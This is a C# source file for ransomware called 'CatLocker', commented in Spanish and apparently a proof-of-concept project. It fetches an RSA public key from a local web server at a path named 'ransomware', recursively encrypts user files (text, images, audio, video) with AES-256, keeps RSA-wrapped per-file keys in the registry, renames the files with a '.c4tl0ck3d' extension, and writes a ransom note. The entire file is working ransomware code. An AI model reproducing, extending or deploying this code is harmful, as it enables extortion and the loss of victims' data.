using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using System.IO;
using System.Threading.Tasks;
// https://github.com/jrnker/CSharp-easy-RSA-PEM
using CSharp_easy_RSA_PEM;

namespace CatLocker {
    class Program {
        // Directorio de inicio(recomendado que se haga con una busqueda de posibles unidades a encriptar)
        private static string directorio = "P:\\Prueba";
        // Variable para guardar la clave publica RSA2048
        private static string clave_publica;
        // Extensiones de los ficheros que se pueden encriptar
        private static string[] ExtensionesValida = {".txt", ".jpg", ".png", ".mp3", ".mp4"};


        // Genero un string aleatorio
        public static string RandomString(int size) {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++) {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }
        
        // Funcion para encritar con RSA un texto usando una clave publica
        public static string EncriptarRSA(string str) {
            RSACryptoServiceProvider publc = Crypto.DecodeX509PublicKey(clave_publica);
            return Crypto.EncryptString(str, publc);
        }

        // Funcion para encriptar un fichero con AES256 (FileStream)
        public static void EncriptarArchivo(string file) {
            // Genero la contraseña para este fichero
            string password = RandomString(128);

            // Guardo la contraseña encriptada
            Microsoft.Win32.RegistryKey regKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("c4tl0ck3r");
            regKey.SetValue(file + ".c4tl0ck3d", EncriptarRSA(password));
            regKey.Close();

            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            // Genera un hash SHA256 de la contraseña
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            // Bytes de sal xD
            byte[] saltBytes = new byte[] { 3, 5, 7, 11, 13, 17, 19, 23 };

            using (FileStream ms = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Write)) {
                using (RijndaelManaged AES = new RijndaelManaged()) {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    // CBC para que sea aun mas complejo de romper
                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)) {
                        using (FileStream InputFile = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)) {
                            int data;
                            // TODO: Optimizacion, maximo de bytes a encriptar por fichero(para que termine antes)
                            int max_bytes_encrypt = 100 * 1024 * 1024; // 100MB
                            int byte_num = 0;
                            while ((data = InputFile.ReadByte()) != -1 && byte_num < max_bytes_encrypt) {
                                cs.WriteByte((byte)data);
                                //ms.WriteByte((byte)data);
                                byte_num++;
                            }
                            InputFile.Close();
                        }
                        cs.Close();
                    }
                }
                ms.Close();
            }
            // Renombro el fichero
            File.Move(file, file + ".c4tl0ck3d");

        }

        // Busqueda recursiva de ficheros a encriptar
        private static void EncriptarDirectorio(string sDir) {
            // Ficheros del directorio
            foreach (string fichero in Directory.GetFiles(sDir)) {
                string extension = Path.GetExtension(fichero);
                if (ExtensionesValida.Contains(extension) && Path.GetFileName(fichero) != "ENCRIPTADO.txt") {
                    new Task(() => { EncriptarArchivo(fichero); }).Start();
                }
            }
            // Analisis recursivo de directorios
            foreach (string d in Directory.GetDirectories(sDir)) {
                // Mensaje
                File.WriteAllText(directorio + "\\ENCRIPTADO.txt", "Ficheros encriptado blah blah \r\n Clave publica: \r\n" + clave_publica);
                EncriptarDirectorio(d);
            }
        }

        static void Main(string[] args) {
            Console.Write("Inicio\n");

            // Mutex
            // TODO: Implementar mutex con un proceso para mejorar su eficacia
            Microsoft.Win32.RegistryKey regKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("c4tl0ck3r");
            if (regKey.GetValue("mutex") != null)
                return; // Exclusion mutua
            regKey.SetValue("mutex", "1");
            regKey.Close();

            // Descargo la clave publica del servidor web(u otra implementacion)
            WebClient client = new WebClient();
            clave_publica = client.DownloadString("http://localhost/ransomware/generar.php");

            // Inicia la encriptacion
            EncriptarDirectorio(directorio);

            // FIN
            Console.Write("Pulsa intro para cerrar\n");
            Console.ReadLine();
        }
    }
}
